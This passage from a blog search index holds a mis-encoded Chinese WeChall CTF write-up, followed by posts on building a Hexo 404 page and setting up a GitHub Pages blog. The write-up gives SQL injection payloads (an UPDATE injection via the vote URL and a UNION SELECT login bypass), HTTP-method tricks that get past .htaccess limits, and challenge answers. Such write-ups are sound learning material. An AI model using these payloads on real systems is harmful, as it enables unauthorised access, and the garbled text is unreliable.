<p>UPDATE noescvotes SET <code>bill</code>=111%23<code>=</code>bill`+1 WHERE id=1</p>
</blockquote>
<p>æ„é€ URLï¼š</p>
<blockquote>
<p><a href="http://www.wechall.net/challenge/no_escape/?vote_for=bill`=111%23" target="_blank" rel="external">http://www.wechall.net/challenge/no_escape/?vote_for=bill`=111%23</a></p>
</blockquote>
<h1 id="Training-Crypto-Substitution-I"><a href="#Training-Crypto-Substitution-I" class="headerlink" title="Training: Crypto - Substitution I"></a>Training: Crypto - Substitution I</h1><p><strong>å•è¡¨ç½®æ¢å¯†ç </strong></p>
<p>å¯†æ–‡å¦‚ä¸‹ï¼š</p>
<pre><code>DK OAM VTFXLAOK LIG KIQ PVE BMVG OAXH FK RBXMEG X VF XFZBMHHMG YMBK CMTT GIEM KIQB HITQOXIE UMK XH ZMFLMZXAFEXL OAXH TXOOTM PAVTTMELM CVH EIO OII AVBG CVH XO
</code></pre><p>å¯†é’¥çŸ­è¯­å¯†ç å°±æ˜¯é€‰ä¸€ä¸ªè‹±æ–‡çŸ­è¯­ä½œä¸ºå¯†é’¥å­—(Key Word)æˆ–å¯†é’¥çŸ­è¯­(Key Phrase)ï¼Œå¦‚HAPPY NEW YEARï¼Œå»æ‰é‡å¤å­—æ¯å¾—HAPYNEWRã€‚å°†å®ƒä¾æ¬¡å†™åœ¨æ˜æ–‡å­—æ¯è¡¨ä¹‹ä¸‹ï¼Œè€Œåå†å°†å­—æ¯è¡¨ä¸­æœªåœ¨çŸ­è¯­ä¸­å‡ºç°è¿‡çš„å­—æ¯ä¾æ¬¡å†™äºæ­¤çŸ­è¯­ä¹‹åï¼Œå°±å¯æ„é€ å‡ºä¸€ä¸ªå­—æ¯ä»£æ¢è¡¨ï¼š</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_zhihuan_1.png" alt=""></p>
<p>å¯¹ç…§è¡¨å°±è¡Œäº†ã€‚</p>
<p><a href="http://quipqiup.com/index.php" target="_blank" rel="external">å…è´¹ç ´è§£åœ°å€</a></p>
<pre><code>BY THE ALMIGHTY GOD YOU CAN READ THIS MY FRIEND I AM IMPRESSED VERY WELL DONE YOUR SOLUTION KEY IS PEMGEPIHMNIG THIS LITTLE CHALLENGE WAS NOT TOO HARD WAS IT
</code></pre><h1 id="hi"><a href="#hi" class="headerlink" title="hi"></a>hi</h1><p>è¯´äº†é‚£ä¹ˆå¤šå±è¯ï¼Œå°±æ˜¯ä¸€ä¸ªç­‰å·®æ•°åˆ—ã€‚</p>
<p>ç¬¬ä¸€åˆ†é’Ÿæ˜¯2ï¼Œä»¥åä¾æ¬¡åŠ ä¸€ï¼Œæœ€åä¸€é¡¹æ˜¯17591026060781</p>
<p>æ‰€ä»¥æ€»å…±æœ‰<br><code>(2+17591026060781)*17591026060781/2</code></p>
<p>å‘ç°ç»“æœç«Ÿç„¶æ˜¯å°æ•°ï¼Œæ”¹ä¸º<code>(2+17591026060782)*17591026060782/2</code>ç«Ÿç„¶å¯¹äº†ã€‚ã€‚ã€‚</p>
<h1 id="Training-MySQL-II"><a href="#Training-MySQL-II" class="headerlink" title="Training: MySQL II"></a>Training: MySQL II</h1><p><strong>.htaccess</strong></p>
<p>username passwordåˆ†å¼€æ¥éªŒè¯ã€‚é€šå¸¸çš„åˆ©ç”¨æ–¹æ³•æ˜¯ä½¿ç”¨unionæ„é€ å·²çŸ¥MD5å€¼çš„æŸ¥è¯¢ã€‚</p>
<p>æ„é€ è¯­å¥ï¼š</p>
<pre><code>username=-1&apos; union select 1,&apos;admin&apos;,&apos;e10adc3949ba59abbe56e057f20f883e&apos; %23&amp;password=123456&amp;login=Login
</code></pre><p>è¿™å¥è¯é¦–å…ˆé€šè¿‡username=-1å°†åŸè¯­å¥æŠ¥é”™ã€‚å› æ­¤è¿”å›çš„å°†ä¼šæ˜¯ç¬¬äºŒæ¡è¯­å¥äº§ç”Ÿçš„ä¿¡æ¯ã€‚<br>è€Œæˆ‘ä»¬union selectçš„æ˜¯ç›´æ¥æ„é€ äº†ç”¨æˆ·åä¸ºadminï¼Œå¯†ç ä¸º123456çš„md5å€¼ã€‚è¿™æ ·å°±å¯ä»¥è®©ç¨‹åºè¯¯è®¤ä¸ºæˆ‘ä»¬æ„é€ çš„ä¿¡æ¯å°±æ˜¯å®ƒä»æ•°æ®åº“é‡Œé¢æå–å¾—åˆ°çš„ä¿¡æ¯ã€‚<br><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_mysql_2.png" alt=""></p>
<h1 id="Limited-Access"><a href="#Limited-Access" class="headerlink" title="Limited Access"></a>Limited Access</h1><p>è®©æˆ‘ä»¬è®¿é—®<code>.htaccess</code></p>
<p>æºç å¦‚ä¸‹ï¼š</p>
<pre><code>AuthUserFile .htpasswd
AuthGroupFile /dev/null
AuthName &quot;Authorization Required for the Limited Access Challenge&quot;
AuthType Basic
&lt;Limit GET&gt;require valid-user
&lt;/Limit&gt;
</code></pre><p>æºç ä¸­é™åˆ¶äº†<code>GET</code></p>
<p>æ‰€ä»¥ä½¿ç”¨postå³å¯</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_access_1.png" alt=""></p>
<h1 id="Training-Regex"><a href="#Training-Regex" class="headerlink" title="Training: Regex"></a>Training: Regex</h1><p><strong>æ­£åˆ™è¡¨è¾¾å¼</strong></p>
<p>åŒ¹é…ä¸€ä¸ªç©ºå­—ç¬¦å°±è¡Œäº†ã€‚</p>
<pre><code>æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ç©ºå€¼æ–¹å¼å¦‚ä¸‹ï¼š
\b åŒ¹é…å•è¯å¼€å¤´æˆ–ç»“å°¾ä½ç½®
^ åŒ¹é…å­—ç¬¦ä¸²å¼€ç«¯ä½ç½®
$ åŒ¹é…å­—ç¬¦ä¸²ç»“å°¾ä½ç½®
\s åŒ¹é…ä¸€åˆ‡ç©ºç™½å­—ç¬¦
\n åŒ¹é…æ¢è¡Œ
</code></pre><p>ä»£ç å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>/^$/</p>
</blockquote>
<h1 id="Training-Crypto-Caesar-II"><a href="#Training-Crypto-Caesar-II" class="headerlink" title="Training: Crypto - Caesar II"></a>Training: Crypto - Caesar II</h1><pre><code>s = &apos;77 1F 1F 14 20 1A 1F 12 5C 20 29 1F 25 20 23 1F 1C 26 15 14 20 1F 1E 15 20 1D 1F 22 15 20 13 18 11 1C 1C 15 1E 17 15 20 19 1E 20 29 1F 25 22 20 1A 1F 25 22 1E 15 29 5E 20 04 18 19 23 20 1F 1E 15 20 27 11 23 20 16 11 19 22 1C 29 20 15 11 23 29 20 24 1F 20 13 22 11 13 1B 5E 20 07 11 23 1E 57 24 20 19 24 6F 20 61 62 68 20 1B 15 29 23 20 19 23 20 11 20 21 25 19 24 15 20 23 1D 11 1C 1C 20 1B 15 29 23 20 11 13 15 5C 20 23 1F 20 19 24 20 23 18 1F 25 1C 14 1E 57 24 20 18 11 26 15 20 24 11 1B 15 1E 20 29 1F 25 20 24 1F 1F 20 1C 1F 1E 17 20 24 1F 20 14 15 13 22 29 20 24 20 24 18 19 23 20 1D 15 23 23 11 17 15 5E 20 07 15 1C 1C 20 14 1F 1E 15 5C 20 29 1F 25 22 20 23 1F 1C 25 24 19 1F 1E 20 19 23 20 1D 20 23 11 22 22 15 23 20 1D 1E 17 5E&apos;
s = s.split()
for key in range(0,128+1,1):
    for i in s:
        i = int(i,16)
        print (chr((i + key + 256) % 256 ), end = &apos;&apos;)
    print (key)
</code></pre><p>key=80æ—¶</p>
<pre><code>Ã‡oodpjobÂ¬pyoupsolvedponepmorepchallengepinpyourpjourneyÂ®pThisponepwaspfairlypeasyptopcrackÂ®pWasnÂ§tpitÂ¿pÂ±Â²Â¸pkeyspispapquitepsmallpkeyspaceÂ¬psopitpshouldnÂ§tphaveptakenpyouptooplongptopdecryptpthispmessageÂ®pWellpdoneÂ¬pyourpsolutionpispmpsarrespmngÂ®
</code></pre><h1 id="Stegano-Attachment"><a href="#Stegano-Attachment" class="headerlink" title="Stegano Attachment"></a>Stegano Attachment</h1><p>ä¸‹è½½å›¾ç‰‡ä¹‹åï¼Œnotepadæ‰“å¼€</p>
<p>å‘ç°ï¼š<code>solution.txt</code></p>
<p>æ”¹åç¼€ä¸ºrar</p>
<blockquote>
<p>IDSRGRNENMPS</p>
</blockquote>
<h1 id="Training-LSB"><a href="#Training-LSB" class="headerlink" title="Training: LSB"></a>Training: LSB</h1><p>æ”¾å…¥ç¥å™¨<code>stegsolve</code>ä¸­</p>
<blockquote>
<p>CBNMGNBFMOHN</p>
</blockquote>
<h1 id="Limited-Access-Too"><a href="#Limited-Access-Too" class="headerlink" title="Limited Access Too"></a>Limited Access Too</h1><p>è®¿é—®.htaccesså‘ç°å‡ ä¹è¿‡æ»¤äº†æ‰€æœ‰æ–¹æ³•</p>
<blockquote>
<p>GET POST HEAD PUT DELETE CONNECT OPTIONS</p>
</blockquote>
<ul>
<li>phpä¼šå°†TOæ–¹æ³•ç»™è§£ææˆGETæ–¹æ³•ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æŠ“åŒ…ï¼Œæ”¹ä¸ºTO</li>
<li>ä½¿ç”¨moveæ–¹æ³•</li>
</ul>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_access_2.png" alt=""></p>
<h1 id="PHP-0815"><a href="#PHP-0815" class="headerlink" title="PHP 0815"></a>PHP 0815</h1><p>æºç å¦‚ä¸‹ï¼š</p>
<pre><code>&lt;?
$whitelist = array(1, 2, 3);
if (false === ($show = isset($_GET[&apos;show&apos;]) ? $_GET[&apos;show&apos;] : false)) {
    die(&apos;MISSING PARAMETER; USE foo.bar?show=[1-3]&apos;);
}
elseif (in_array($show, $whitelist)){
    $query = &quot;SELECT 1 FROM `table` WHERE `id`=$show&quot;;
    echo &apos;Query: &apos;.htmlspecialchars($query, ENT_QUOTES).&apos;&lt;br/&gt;&apos;;
    die(&apos;SHOWING NUMBER &apos;.htmlspecialchars($show, ENT_QUOTES));
}else 
{
        die(&apos;HACKER NONONO&apos;);
}
</code></pre><p>è¿™æ˜æ˜¾æ˜¯SQLæ³¨å…¥ï¼Œä½†æ˜¯é˜²æ³¨å…¥çš„æ–¹æ³•æœ‰å¾ˆå¤šï¼Œéœ€è¦æ‰¾åˆ°æœ€ç®€å•çš„ï¼Œäºæ˜¯æ‰¾åˆ°ä¸€ä¸ªæ–¹æ³•ï¼š</p>
<p><strong>å°†ä¼ å…¥çš„å‚æ•°éœ€è¦è½¬æ¢æˆæ•´æ•°ã€‚</strong></p>
<p>é€šå¸¸æ‰€ç”¨çš„å‡½æ•°æ˜¯int()æˆ–è€…intval()</p>
<p>ç„¶è€Œå‡ºäºphp wtfçš„atoiè½¬æ¢è§„åˆ™ï¼Œ$show-0è¶³ä»¥å®Œæˆ</p>
<h1 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars"></a>htmlspecialchars</h1><p>è¿™é¢˜æ˜¯xssï¼Œå€Ÿè¿™ä¸ªï¼Œå†å†™ä¸€ç¯‡xssçš„æ€»ç»“ã€‚</p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> writeup </tag>
            
            <tag> WeChall </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[åˆ›å»º404é¡µé¢]]></title>
      <url>/2015/10/13/%E5%88%9B%E5%BB%BA404%E9%A1%B5%E9%9D%A2/</url>
      <content type="html"><![CDATA[<h1 id="è‡ªå®šä¹‰é¡µé¢"><a href="#è‡ªå®šä¹‰é¡µé¢" class="headerlink" title="è‡ªå®šä¹‰é¡µé¢"></a>è‡ªå®šä¹‰é¡µé¢</h1><p>ä»¥404é¡µé¢ä¸ºä¾‹</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><p>æ‰§è¡Œå‘½ä»¤</p>
<pre><code>$ hexo new page &quot;404&quot;
INFO  Created: D:\Hexo\Hexo\source\404\index-1.md
</code></pre><p>ç¼–å†™ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code>title: 404 Not Foundï¼šè¯¥é¡µæ— æ³•æ˜¾ç¤º
comments: false
permalink: /404
fancybox: false
---
&lt;style type=&quot;text/css&quot;&gt;
.article-title {
    font-size: 2.1em;
}
strong a {
    color: #747474;
}
.share {
    display: none;
}
.player {
    margin-left: -10px;
}
.sign {
    text-align: right;
    font-style: italic;
}
#page-visit {
    display: none;
}
.center {
    text-align: center;
    height: 2.5em;
    font-weight: bold;
}
.search2 {
    height: 2.2em;
    font-size: 1em;
    width: 50%;
    margin: auto 24%;
    color: #727272;
    opacity: .6;
    border: 2px solid lightgray;
}
.search2:hover {
    opacity: 1;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.3)
    };
.article-entry hr {
    margin: 0;
}
.pic {
    text-align: center;
    margin: 0;
}
.pic br {
    display: none;
}
&lt;/style&gt;

***

&lt;div class=&quot;pic&quot;&gt;
&lt;img src=&quot;/img/404.jpg&quot; title=&quot;Mihawk-Wind&quot;&gt;
&lt;/div&gt;

&lt;p class=&quot;center&quot;&gt;å¾ˆæŠ±æ­‰ï¼Œæ‚¨æ‰€è®¿é—®çš„åœ°å€å¹¶ä¸å­˜åœ¨: &lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/&quot;&gt;å›ä¸»é¡µ&lt;/a&gt; Â· &lt;a href=&quot;/archives&quot;&gt;æ‰€æœ‰æ–‡ç« &lt;/a&gt; Â· &lt;a href=&quot;/about&quot;&gt;å…³äº&lt;/a&gt;&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;å¯åœ¨è¾¹æ æœç´¢æ¡†ä¸­å¯¹æœ¬ç«™è¿›è¡Œæ£€ç´¢ï¼Œä»¥è·å–ç›¸å…³ä¿¡æ¯ã€‚&lt;/p&gt;

&lt;div style=&quot;text-align: center&quot;&gt;
ä»¥ä¸‹æ˜¯åšä¸»å–œæ¬¢çš„ä¸€äº›æ­Œæ›²ï¼Œå¯ä»¥å¬å¬ï¼Œç¨ä½œä¼‘æ¯~
&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=320 height=330 src=&quot;http://music.163.com/outchain/player?type=0&amp;id=112513213&amp;auto=0&amp;height=430&quot;&gt;&lt;/iframe&gt;
&lt;/div&gt;
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> å‰ç«¯ </tag>
            
            <tag> ç¼–ç¨‹ </tag>
            
            <tag> åšå®¢ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ä½¿ç”¨Github+Hexoæ­å»ºç‹¬ç«‹åšå®¢]]></title>
      <url>/2015/09/13/%E4%BD%BF%E7%94%A8Github-Hexo%E6%90%AD%E5%BB%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/</url>
      <content type="html"><![CDATA[<p>åº”ç”¨GitHub Pagesåˆ›å»ºå±äºè‡ªå·±çš„ä¸ªäººåšå®¢ï¼ŒGitHubå°†æä¾›å…è´¹çš„ç©ºé—´ã€‚GitHubæä¾›çš„åŸŸåï¼ˆç”¨æˆ·å+github+ioï¼‰,åœ¨Repository nameå¯¹åº”å¤„å¡«å†™èµ„æºåï¼Œå…¶éœ€è¦ä½¿ç”¨è‡ªå·±çš„ç”¨æˆ·åï¼Œæ¯ä¸ªç”¨æˆ·åä¸‹é¢åªèƒ½å»ºç«‹ä¸€ä¸ªï¼Œå¹¶ä¸”èµ„æºå‘½åå¿…é¡»ç¬¦åˆè¿™æ ·çš„è§„åˆ™username/username.github.ioï¼Œä¹‹åå‹¾é€‰ä¸‹é¢çš„â€Initialize this repository with a READMEâ€<br><a id="more"></a></p>
<h1 id="å®‰è£…å‡†å¤‡"><a href="#å®‰è£…å‡†å¤‡" class="headerlink" title="å®‰è£…å‡†å¤‡"></a>å®‰è£…å‡†å¤‡</h1><p>ç¯å¢ƒæ­å»ºï¼š</p>
<ul>
<li>Node.jsï¼š<a href="https://nodejs.org/en/" target="_blank" rel="external">ä¸‹è½½åœ°å€</a></li>
<li>Gitï¼š<a href="https://git-scm.com/download/win" target="_blank" rel="external">ä¸‹è½½åœ°å€</a><br>#GitHubæ³¨å†Œä¸é…ç½®</li>
<li><a href="http://github.com/" target="_blank" rel="external">æ³¨å†Œåœ°å€</a></li>
<li>å…·ä½“é…ç½®åŠä½¿ç”¨è¯·å‚ç…§ï¼š<a href="http://beiyuu.com/github-pages" target="_blank" rel="external">ä½¿ç”¨Github Pagesæ­å»ºç‹¬ç«‹åšå®¢</a></li>
<li>é…ç½®å¹¶æ·»åŠ SSH KEYåˆ°Github</li>
<li>æµ‹è¯•</li>
</ul>
<p>å¯ä»¥è¾“å…¥ä¸‹é¢çš„å‘½ä»¤ï¼Œçœ‹çœ‹è®¾ç½®æ˜¯å¦æˆåŠŸï¼Œgit@github.comçš„éƒ¨åˆ†ä¸è¦ä¿®æ”¹ï¼š</p>
<blockquote>
<p>$ ssh -T git@github.com</p>
</blockquote>
<p> å¦‚æœæ˜¯ä¸‹é¢çš„åé¦ˆï¼š</p>
<blockquote>
<p>The authenticity of host â€˜github.com (207.97.227.239)â€™ canâ€™t be established.<br>RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.<br>Are you sure you want to continue connecting (yes/no)?</p>
</blockquote>
<p>ä¸è¦ç´§å¼ ï¼Œè¾“å…¥yeså°±å¥½ï¼Œç„¶åä¼šçœ‹åˆ°ï¼š</p>
<blockquote>
<p>Hi cnfeat! Youâ€™ve successfully authenticated,<br>but GitHub does not provide shell access.</p>
<p>è®¾ç½®ç”¨æˆ·ä¿¡æ¯ï¼š<br>ç°åœ¨ä½ å·²ç»å¯ä»¥é€šè¿‡SSHé“¾æ¥åˆ°GitHubäº†ï¼Œè¿˜æœ‰ä¸€äº›ä¸ªäººä¿¡æ¯éœ€è¦å®Œå–„çš„ã€‚</p>
</blockquote>
<p>Gitä¼šæ ¹æ®ç”¨æˆ·çš„åå­—å’Œé‚®ç®±æ¥è®°å½•æäº¤ã€‚</p>
<blockquote>
<p>$ git config â€“global user.name â€œcnfeatâ€//ç”¨æˆ·å<br>$ git config â€“global user.email â€œcnfeat@gmail.comâ€//å¡«å†™è‡ªå·±çš„é‚®ç®±</p>
</blockquote>
<p>SSH Keyé…ç½®æˆåŠŸï¼Œæœ¬æœºå·²æˆåŠŸè¿æ¥åˆ°github.</p>
<h1 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h1><p>Hexoæ˜¯ä¸€ä¸ªç®€å•ã€å¿«é€Ÿã€å¼ºå¤§çš„åšå®¢å‘å¸ƒå·¥å…·ï¼Œæ”¯æŒMarkdownæ ¼å¼ã€‚</p>
<h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>æ–°å»ºä¸€ä¸ªæ–‡æ¡£ å½“ä½œåšå®¢æ ¹ç›®å½•ï¼ˆå°½é‡ä¸è¦æœ‰ä¸­æ–‡ï¼‰ï¼Œåœ¨æ­¤ç›®å½•ä¸‹æ‰“å¼€Git Bashï¼ˆå‰æç¡®ä¿Node.jså·²ç»å®‰è£…ï¼Œç¯å¢ƒé…ç½®OKï¼‰</p>
<blockquote>
<p>$ npm install -g hexo</p>
<p>$ hexo init</p>
<p>$ hexo generate</p>
<p>$ hexo server</p>
</blockquote>
<p>æ‰“å¼€æœ¬åœ°<code>http://localhost:4000/</code>ä½ å°±å¯ä»¥çœ‹åˆ°hexoç½‘ç«™äº†ã€‚</p>
<p><strong>æ³¨ï¼š</strong></p>
<ul>
<li><code>hexo server</code>å¯åŠ¨ä¹‹åæ— æ³•è®¿é—®ï¼šä½¿ç”¨-på‚æ•°æ”¹ç«¯å£</li>
<li><code>npm</code>å‘½ä»¤æ‰¾ä¸åˆ°ï¼šä½¿ç”¨npm.cmd,æˆ–è€…å¸è½½é‡è£…</li>
<li><code>git</code>å‘½ä»¤æ‰¾ä¸åˆ°ï¼š<code>git init</code>å…ˆåˆå§‹åŒ–<h1 id="éƒ¨ç½²åˆ°GitHub"><a href="#éƒ¨ç½²åˆ°GitHub" class="headerlink" title="éƒ¨ç½²åˆ°GitHub"></a>éƒ¨ç½²åˆ°GitHub</h1>ç¼–è¾‘hexoç›®å½•ä¸‹çš„_config.ymlï¼ˆ<strong>æ­¤æ–‡ä»¶ä¸ºä½ ç½‘ç«™çš„é…ç½®æ–‡ä»¶</strong>)</li>
</ul>
<p>ä¿®æ”¹ä»£ç å¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">type: git</div><div class="line">repository: http://github.com/drops123456/drops123456.github.io.git</div><div class="line">		branch: master</div></pre></td></tr></table></figure></p>
<p>ç„¶åæ‰§è¡Œï¼š</p>
<blockquote>
<p>hexo g ç¼–è¯‘ç”Ÿæˆé™æ€æ–‡ä»¶</p>
<p>hexo d å‘å¸ƒåˆ°Github</p>
</blockquote>
<p>è®¿é—®ï¼š<code>http://username.github.io/</code>å³å¯çœ‹åˆ°ç½‘ç«™ã€‚</p>
<p>å¦‚æœéœ€è¦ä½¿ç”¨åˆ«çš„åŸŸåï¼Œåœ¨æ ¹ç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶<code>CNAME</code>å†…å®¹ä¸ºä½ çš„åŸŸåå³å¯ï¼ˆå…³äºAè®°å½•å’ŒCNAMEï¼Œè¯·å‚è€ƒï¼š<a href="http://blog.xieyc.com/differences-between-a-record-and-cname-record/" target="_blank" rel="external">åŸŸåè§£æçš„åŒºåˆ«</a>ï¼‰</p>
<h1 id="cloneä¸»é¢˜"><a href="#cloneä¸»é¢˜" class="headerlink" title="cloneä¸»é¢˜"></a>cloneä¸»é¢˜</h1><p>é€‰æ‹©ä¸€ä¸ªä¸»é¢˜</p>
<ul>
<li><p>ä½¿ç”¨å‘½ä»¤</p>
<blockquote>
<p>git clone <a href="http://example.com" target="_blank" rel="external">http://example.com</a></p>
</blockquote>
</li>
<li><p>ä¸‹è½½zipåŒ…</p>
</li>
</ul>
<p>åœ¨æŠŠä¸‹è½½çš„ä¸»é¢˜æ‹·è´åˆ°hexo/themesç›®å½•ä¸‹ï¼Œé…ç½®_config.yml</p>
<blockquote>
<p>theme: yelee</p>
</blockquote>
<h1 id="éƒ¨ç½²ä¸»é¢˜"><a href="#éƒ¨ç½²ä¸»é¢˜" class="headerlink" title="éƒ¨ç½²ä¸»é¢˜"></a>éƒ¨ç½²ä¸»é¢˜</h1><pre><code>$ hexo g #ç”Ÿæˆ
$ hexo s #å¯åŠ¨æœ¬åœ°æœåŠ¡ï¼Œè¿›è¡Œæ–‡ç« é¢„è§ˆè°ƒè¯•
</code></pre><h1 id="å®ä¾‹example"><a href="#å®ä¾‹example" class="headerlink" title="å®ä¾‹example"></a>å®ä¾‹example</h1><p>ä»¥æˆ‘çš„ç½‘ç«™çš„é…ç½®ï¼Œå¦‚ä¸‹ï¼š</p>
<pre><code># Hexo Configuration
## Docs: https://hexo.io/docs/configuration.html
## Source: https://github.com/hexojs/hexo/

# Site
title: Joy_nick
subtitle: No pains, No gainsï¼
description: No pains, No gainsï¼
author: Joy_nick
language: zh-CN
timezone:

# URL
## If your site is put in a subdirectory, set url as &apos;http://yoursite.com/child&apos; and root as &apos;/child/&apos;
url: http://byd.dropsec.xyz
root: /
permalink: :year/:month/:day/:title/
permalink_defaults:

# Directory
source_dir: source
public_dir: public
tag_dir: tags
archive_dir: archives
category_dir: categories
code_dir: downloads/code
i18n_dir: :lang
skip_render:

# Writing
new_post_name: :title.md # File name of new posts
default_layout: post
titlecase: false # Transform title into titlecase
external_link: true # Open external links in new tab
filename_case: 0
render_drafts: false
post_asset_folder: false
relative_link: false
future: true
highlight:
  enable: true
  line_number: true
  auto_detect: false
  tab_replace:

# Category &amp; Tag
default_category: uncategorized
category_map:
tag_map:

# Date / Time format
## Hexo uses Moment.js to parse and display date
## You can customize the date format as defined in
## http://momentjs.com/docs/#/displaying/format/
date_format: YYYY-MM-DD
time_format: HH:mm:ss

# Pagination
## Set per_page to 0 to disable pagination
per_page: 8
pagination_dir: page

# Extensions
## Plugins: https://hexo.io/plugins/
## Themes: https://hexo.io/themes/
theme: yelee

feed:    #ä¹‹åé…ç½®rssä¼šç”¨ï¼Œä½¿ç”¨å¦‚ä¸‹é…ç½®å³å¯
  type: atom
  path: atom.xml
  limit: 20 

# Deployment
## Docs: https://hexo.io/docs/deployment.html
deploy:
  type: git
  repository: http://github.com/drops123456/drops123456.github.io.git
  branch: master
</code></pre><h1 id="å‘å¸ƒæ–°çš„æ–‡ç« "><a href="#å‘å¸ƒæ–°çš„æ–‡ç« " class="headerlink" title="å‘å¸ƒæ–°çš„æ–‡ç« "></a>å‘å¸ƒæ–°çš„æ–‡ç« </h1><ul>
<li><p>cdåˆ°ç½‘ç«™æ ¹ç›®å½•ä¸‹</p>
<blockquote>
<p>$ hexo new â€œMy New Postâ€</p>
<p>[info] File created at d:\Hexo\source_posts\My-New-Post.md</p>
</blockquote>
</li>
<li><p>ç¼–è¯‘ç”Ÿæˆé™æ€æ–‡ä»¶</p>
<blockquote>
<p>hexo g</p>
</blockquote>
</li>
<li><p>éƒ¨ç½²åˆ°Github</p>
<blockquote>
<p>hexo d<br>ä¹Ÿå¯ä»¥ä½¿ç”¨å‘½ä»¤ï¼š<code>hexo g -d</code> </p>
</blockquote>
</li>
</ul>
<p><strong>æ³¨ï¼šå»ºè®®æ¯æ¬¡éƒ¨ç½²å‰ï¼Œå…ˆæœ¬åœ°æŸ¥çœ‹</strong></p>
<h1 id="å‘½ä»¤æ€»ç»“"><a href="#å‘½ä»¤æ€»ç»“" class="headerlink" title="å‘½ä»¤æ€»ç»“"></a>å‘½ä»¤æ€»ç»“</h1><pre><code>hexo n == hexo new
hexo g == hexo generate
hexo s == hexo server
hexo d == hexo deploy
hexo new &quot;postName&quot; #æ–°å»ºæ–‡ç« 
hexo new page &quot;pageName&quot; #æ–°å»ºé¡µé¢
hexo generate #ç”Ÿæˆé™æ€é¡µé¢è‡³publicç›®å½•
hexo server #å¼€å¯é¢„è§ˆè®¿é—®ç«¯å£ï¼ˆé»˜è®¤ç«¯å£4000ï¼Œ&apos;ctrl + c&apos;å…³é—­serverï¼‰
hexo deploy #å°†.deployç›®å½•éƒ¨ç½²åˆ°GitHub
hexo help  # æŸ¥çœ‹å¸®åŠ©
hexo version  #æŸ¥çœ‹Hexoçš„ç‰ˆæœ¬
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> åšå®¢ </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
